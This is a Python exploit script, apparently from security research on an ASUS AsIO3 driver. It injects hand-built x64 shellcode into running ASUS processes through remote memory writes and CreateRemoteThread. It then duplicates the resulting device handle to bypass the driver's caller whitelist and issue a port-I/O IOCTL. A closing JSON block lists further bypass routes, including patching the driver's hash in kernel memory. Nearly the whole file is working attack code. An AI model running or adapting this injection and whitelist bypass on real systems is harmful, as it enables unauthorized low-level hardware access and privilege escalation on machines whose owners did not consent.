"""
Targeted injection test - skip handle enum, just inject into injectable ASUS procs.
Focus on the ones most likely to be whitelisted.
"""
import ctypes
import ctypes.wintypes as wintypes
from ctypes import byref, windll, c_size_t
import struct
import os
import sys
import json

REPORT_DIR = r"C:\Users\researcher\OneDrive\Desktop\report\AsIO3"
outf = open(os.path.join(REPORT_DIR, "injection_test_output.txt"), "w")

def log(msg):
    print(msg)
    outf.write(msg + "\n")
    outf.flush()

ntdll = windll.ntdll
kernel32 = windll.kernel32
kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.CreateFileW.restype = wintypes.HANDLE
kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.restype = ctypes.c_void_p
kernel32.GetProcAddress.restype = ctypes.c_void_p
kernel32.GetModuleHandleW.restype = wintypes.HANDLE
kernel32.CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
DUPLICATE_SAME_ACCESS = 0x00000002

is_admin = ctypes.windll.shell32.IsUserAnAdmin()
log(f"Admin: {is_admin}, PID: {os.getpid()}")

# Injectable ASUS processes (from previous run)
# These are user-session processes we can inject into
targets = [
    (14456, "AsusOptimizationStartupTask.exe"),
    (14800, "ArmouryCrate.UserSessionHelper.exe"),
    (18868, "ArmouryCrate.exe"),
    (14140, "AacAmbientLighting.exe"),
    (21316, "ArmourySocketServer.exe"),
    (21600, "asus_framework.exe"),
    (4684, "AsusOSD.exe"),
    (10300, "AsusSoftwareManagerAgent.exe"),
    (27168, "ArmourySwAgent.exe"),
]

results = []

for pid, name in targets:
    log(f"\n--- Injecting into {name} (PID {pid}) ---")

    INJECT_ACCESS = 0x0002 | 0x0008 | 0x0010 | 0x0020 | 0x0040  # CREATE_THREAD|VM_OP|VM_READ|VM_WRITE|DUP_HANDLE
    h_proc = kernel32.OpenProcess(INJECT_ACCESS, False, pid)
    if not h_proc:
        err = kernel32.GetLastError()
        log(f"  OpenProcess failed: error {err}")
        results.append({"pid": pid, "name": name, "error": f"openprocess_{err}"})
        continue

    # Alloc memory
    device_path = r"\\.\Asusgio3" + "\x00"
    path_bytes = device_path.encode('utf-16-le')

    mem = kernel32.VirtualAllocEx(h_proc, None, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    if not mem:
        log(f"  VirtualAllocEx failed")
        kernel32.CloseHandle(h_proc)
        results.append({"pid": pid, "name": name, "error": "valloc"})
        continue

    written = c_size_t(0)
    kernel32.WriteProcessMemory(h_proc, mem, path_bytes, len(path_bytes), byref(written))
    result_addr = mem + 0x200
    error_addr = mem + 0x208

    k32 = kernel32.GetModuleHandleW("kernel32.dll")
    cfw = kernel32.GetProcAddress(k32, b"CreateFileW")
    gle = kernel32.GetProcAddress(k32, b"GetLastError")

    # Shellcode: CreateFileW + GetLastError, store both
    sc = bytearray()
    sc += b'\x48\x83\xEC\x58'                          # sub rsp, 0x58
    sc += b'\x48\xB9' + struct.pack('<Q', mem)          # mov rcx, path
    sc += b'\xBA' + struct.pack('<I', 0xC0000000)       # mov edx, GENERIC_RW
    sc += b'\x41\xB8' + struct.pack('<I', 3)            # mov r8d, 3
    sc += b'\x4D\x31\xC9'                               # xor r9, r9
    sc += b'\xC7\x44\x24\x20' + struct.pack('<I', 3)   # OPEN_EXISTING
    sc += b'\xC7\x44\x24\x28' + struct.pack('<I', 0)   # flags=0
    sc += b'\x48\xC7\x44\x24\x30\x00\x00\x00\x00'     # hTemplate=NULL
    sc += b'\x48\xB8' + struct.pack('<Q', cfw)          # mov rax, CreateFileW
    sc += b'\xFF\xD0'                                   # call rax
    sc += b'\x48\xA3' + struct.pack('<Q', result_addr)  # store handle
    sc += b'\x48\xB8' + struct.pack('<Q', gle)          # mov rax, GetLastError
    sc += b'\xFF\xD0'                                   # call rax
    sc += b'\x89\x04\x25' + struct.pack('<I', error_addr & 0xFFFFFFFF) # WRONG for 64-bit
    # Fix: use mov [abs64], eax
    # Actually let's use a different approach for storing error
    # Remove the bad line, use: mov rcx, error_addr; mov [rcx], eax
    sc = bytearray()
    sc += b'\x48\x83\xEC\x58'                          # sub rsp, 0x58
    sc += b'\x48\xB9' + struct.pack('<Q', mem)          # mov rcx, path
    sc += b'\xBA' + struct.pack('<I', 0xC0000000)       # mov edx, GENERIC_RW
    sc += b'\x41\xB8' + struct.pack('<I', 3)            # mov r8d, 3
    sc += b'\x4D\x31\xC9'                               # xor r9, r9
    sc += b'\xC7\x44\x24\x20' + struct.pack('<I', 3)   # OPEN_EXISTING
    sc += b'\xC7\x44\x24\x28' + struct.pack('<I', 0)   # flags=0
    sc += b'\x48\xC7\x44\x24\x30\x00\x00\x00\x00'     # hTemplate=NULL
    sc += b'\x48\xB8' + struct.pack('<Q', cfw)          # mov rax, CreateFileW
    sc += b'\xFF\xD0'                                   # call rax
    # rax = handle, store it
    sc += b'\x48\xB9' + struct.pack('<Q', result_addr)  # mov rcx, result_addr
    sc += b'\x48\x89\x01'                               # mov [rcx], rax
    # Now get last error
    sc += b'\x48\x83\xEC\x20'                          # sub rsp, 0x20 (shadow)
    sc += b'\x48\xB8' + struct.pack('<Q', gle)          # mov rax, GetLastError
    sc += b'\xFF\xD0'                                   # call rax
    sc += b'\x48\x83\xC4\x20'                          # add rsp, 0x20
    sc += b'\x48\xB9' + struct.pack('<Q', error_addr)   # mov rcx, error_addr
    sc += b'\x89\x01'                                   # mov [rcx], eax
    sc += b'\x48\x83\xC4\x58'                          # add rsp, 0x58
    sc += b'\xC3'                                       # ret

    sc_mem = kernel32.VirtualAllocEx(h_proc, None, len(sc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not sc_mem:
        log(f"  Shellcode alloc failed")
        kernel32.CloseHandle(h_proc)
        results.append({"pid": pid, "name": name, "error": "sc_alloc"})
        continue

    kernel32.WriteProcessMemory(h_proc, sc_mem, bytes(sc), len(sc), byref(written))
    # Pre-fill with sentinel
    kernel32.WriteProcessMemory(h_proc, result_addr, b'\xEE\xEE\xEE\xEE\xEE\xEE\xEE\xEE', 8, byref(written))
    kernel32.WriteProcessMemory(h_proc, error_addr, b'\xDD\xDD\xDD\xDD', 4, byref(written))

    tid = wintypes.DWORD(0)
    ht = kernel32.CreateRemoteThread(h_proc, None, 0, sc_mem, None, 0, byref(tid))
    if not ht:
        err = kernel32.GetLastError()
        log(f"  CreateRemoteThread failed: error {err}")
        kernel32.CloseHandle(h_proc)
        results.append({"pid": pid, "name": name, "error": f"thread_{err}"})
        continue

    log(f"  Thread TID={tid.value}, waiting...")
    wait_result = kernel32.WaitForSingleObject(ht, 15000)
    if wait_result != 0:
        log(f"  Wait timed out or failed (result={wait_result})")
        kernel32.CloseHandle(ht)
        kernel32.CloseHandle(h_proc)
        results.append({"pid": pid, "name": name, "error": "timeout"})
        continue

    # Read results
    rbuf = (ctypes.c_byte * 8)()
    kernel32.ReadProcessMemory(h_proc, result_addr, rbuf, 8, byref(written))
    remote_handle = struct.unpack('<Q', bytes(rbuf))[0]

    ebuf = (ctypes.c_byte * 4)()
    kernel32.ReadProcessMemory(h_proc, error_addr, ebuf, 4, byref(written))
    remote_error = struct.unpack('<I', bytes(ebuf))[0]

    log(f"  Result: handle=0x{remote_handle:X}, error={remote_error}")

    entry = {"pid": pid, "name": name, "handle": remote_handle, "error_code": remote_error}

    if remote_handle not in (0, 0xFFFFFFFFFFFFFFFF, 0xEEEEEEEEEEEEEEEE):
        log(f"  *** SUCCESS! Device opened! ***")
        entry["success"] = True

        # Duplicate handle
        our_h = wintypes.HANDLE(0)
        st = ntdll.NtDuplicateObject(h_proc, remote_handle,
                                      kernel32.GetCurrentProcess(),
                                      byref(our_h), 0, 0, DUPLICATE_SAME_ACCESS)
        if st >= 0 and our_h.value:
            log(f"  Duplicated: 0x{our_h.value:X}")
            ibuf = (ctypes.c_byte * 8)()
            ibuf[0] = 0x80
            obuf = (ctypes.c_byte * 8)()
            br = wintypes.DWORD(0)
            r = kernel32.DeviceIoControl(our_h, 0xA0400F58, ibuf, 8, obuf, 8, byref(br), None)
            if r:
                log(f"  IOCTL SUCCESS! Port 0x80 = 0x{obuf[0]:02X}")
                entry["ioctl_success"] = True
            else:
                ie = kernel32.GetLastError()
                log(f"  IOCTL failed: error {ie}")
                entry["ioctl_error"] = ie
            kernel32.CloseHandle(our_h)
    else:
        log(f"  FAILED (error {remote_error} = {'ACCESS_DENIED' if remote_error==5 else 'OTHER'})")
        entry["success"] = False

    results.append(entry)
    kernel32.CloseHandle(ht)
    kernel32.CloseHandle(h_proc)

# Final summary
log(f"\n{'='*60}")
log("FINAL RESULTS")
log(f"{'='*60}")
successes = [r for r in results if r.get("success")]
if successes:
    log(f"  BYPASS FOUND! {len(successes)} process(es) can open device:")
    for s in successes:
        log(f"    {s['name']} (PID {s['pid']})")
else:
    log(f"  NO bypass via injection. All processes got ACCESS_DENIED.")
    log(f"  This means the driver's whitelist is EMPTY for these PIDs.")
    log(f"  Only AsusCertService.exe (hash-verified) can be enrolled.")
    errors = set(r.get("error_code", 0) for r in results)
    log(f"  Error codes seen: {errors}")

# Save JSON
output = {
    "admin": True,
    "results": results,
    "success": bool(successes),
    "analysis": {
        "driver_enrollment": "IRP_MJ_CREATE calls function at 0x3138 which checks path+hash",
        "hash_at_data_0x150": "32 bytes: CF E4 CD 52 49 D0 6B 17 13 9A 7D 30 EC AE B2 27 1F 4A 11 C4 4E 1E 3B 8B BB E5 55 D7 ED 01 7A 56",
        "hash_is": "SHA-256 of AsusCertService.exe file content (first 0xFF0000 bytes)",
        "why_path_spoof_fails": "Driver reads calling exe from disk and hashes it",
        "notify_callback": "Only handles process EXIT (removes PID from whitelist)",
        "enrollment_trigger": "Every CreateFileW on device triggers enrollment attempt",
        "security_descriptor": "Separate SD check by I/O manager (before IRP reaches driver)",
        "certservice_protection": "Process has restricted DACL - cannot OpenProcess with VM/THREAD access even as admin",
        "recommendation": "Must either: (a) patch driver hash in kernel memory, (b) find process that IS whitelisted and injectable, or (c) use AsusCertService's own COM/RPC interface"
    }
}
with open(os.path.join(REPORT_DIR, "bypass_analysis.json"), 'w') as f:
    json.dump(output, f, indent=2, default=str)

log("\nDone.")
outf.close()
